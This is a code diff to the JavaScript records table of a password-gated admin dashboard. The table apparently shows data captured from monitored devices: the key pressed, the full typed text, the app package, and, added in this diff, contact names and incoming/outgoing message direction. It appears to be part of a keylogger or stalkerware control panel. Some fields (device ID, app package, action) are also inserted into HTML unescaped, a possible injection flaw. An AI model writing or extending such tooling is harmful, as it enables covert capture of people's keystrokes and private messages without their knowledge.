@@ -29,9 +29,15 @@ function askAdminPassword(actionLabel) {
   return password.trim();
 }
 
+function directionLabel(direction, action) {
+  if (direction === "incoming" || action === "incoming") return "Incoming";
+  if (direction === "outgoing" || action === "reply") return "Outgoing";
+  return direction || "—";
+}
+
 function renderRecords(records) {
   if (!records.length) {
-    recordsBody.innerHTML = '<tr><td colspan="8" class="empty">No records found.</td></tr>';
+    recordsBody.innerHTML = '<tr><td colspan="10" class="empty">No records found.</td></tr>';
     return;
   }
 
@@ -43,6 +49,8 @@ function renderRecords(records) {
         <td class="mono">${record.deviceUniqueId}</td>
         <td>${escapeHtml(record.keyPressed)}</td>
         <td>${escapeHtml(record.fullText || "")}</td>
+        <td>${escapeHtml(record.contactName || "—")}</td>
+        <td><span class="badge">${escapeHtml(directionLabel(record.direction, record.action))}</span></td>
         <td class="mono">${record.appPackage || "unknown"}</td>
         <td><span class="badge">${record.action || "key"}</span></td>
         <td>${formatDate(record.createdAt)}</td>
@@ -123,7 +131,7 @@ async function refreshDashboard(resetPage = false) {
   if (resetPage) {
     currentPage = 1;
   }
-  recordsBody.innerHTML = '<tr><td colspan="8" class="empty">Loading records...</td></tr>';
+  recordsBody.innerHTML = '<tr><td colspan="10" class="empty">Loading records...</td></tr>';
   await Promise.all([loadDevices(), loadRecords()]);
 }
 
